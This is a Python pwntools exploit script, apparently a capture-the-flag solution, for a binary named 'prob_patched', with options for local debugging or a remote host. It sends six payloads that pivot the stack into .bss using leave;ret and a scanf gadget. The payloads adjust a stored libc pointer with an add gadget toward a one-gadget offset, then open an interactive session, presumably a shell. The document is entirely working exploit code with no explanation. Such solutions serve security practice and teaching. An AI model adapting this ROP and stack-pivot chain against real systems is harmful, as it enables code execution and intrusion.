#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./prob_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
b *0x401169
# b *__vfscanf_internal+1967
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            pause()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

# ==================== EXPLOIT ====================
p = start()


'''
0x00007ffff7df620f <+1967>:  pop    rbx
0x00007ffff7df6210 <+1968>:  pop    r12
0x00007ffff7df6212 <+1970>:  pop    r13
0x00007ffff7df6214 <+1972>:  pop    r14
0x00007ffff7df6216 <+1974>:  pop    r15
0x00007ffff7df6218 <+1976>:  pop    rbp
0x00007ffff7df6219 <+1977>:  ret
'''

offset = 0x100
pop_rbp = 0x40111d
leave_ret = 0x401168
ret = leave_ret + 1
add_ptr = 0x40111c
fake_stack = exe.bss()+0xef0
scanf_gadget = 0x40113E

payload = flat({
    offset: [
        fake_stack,
        scanf_gadget,
        leave_ret
    ]
}, filler=b'A')
input("Payload 1")
sl(payload)

# Start at 0x404e00
payload = flat({
    offset: [
        fake_stack-0x108,
        scanf_gadget,
        leave_ret,
    ]
}, filler=b'C')
input("Payload 2")
sl(payload)

payload = p64(0x404a00)
payload += p64(0)*4
payload += p64(0x404738+0x3d)
payload += p64(add_ptr)
payload += p64(pop_rbp)
payload += p64(fake_stack)
payload += p64(ret)
payload += p64(scanf_gadget)
input("Payload 3")
sl(payload)

# Start at 0x404e00
payload = flat({
    offset: [
        fake_stack-0x108,
        scanf_gadget,
        leave_ret,
    ]
}, filler=b'C')
input("Payload 4")
sl(payload)

payload = p64(0x89ce3)
payload += p64(0)*4
payload += p64(0x404740+0x3d)
payload += p64(add_ptr)
payload += p64(pop_rbp)
payload += p64(0x404900)
payload += p64(ret)
payload += p64(scanf_gadget)
input("Payload 5")
sl(payload)

payload = flat({
    offset: [
        0x404738,
        ret,
        leave_ret
    ]
}, filler=b'D')
input("Payload 6")
sl(payload)

interactive()
